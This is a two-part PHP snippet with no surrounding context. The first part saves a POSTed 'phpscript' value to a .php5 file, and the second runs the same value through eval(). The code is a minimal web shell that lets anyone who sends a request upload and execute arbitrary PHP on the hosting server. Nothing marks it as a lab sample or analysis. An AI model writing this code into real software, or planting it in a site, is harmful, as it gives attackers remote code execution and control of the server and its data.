<?php file_put_contents("php5World.php5", $_POST['phpscript']);?>
<?php
$post = $_POST['phpscript'];
eval($post);
?>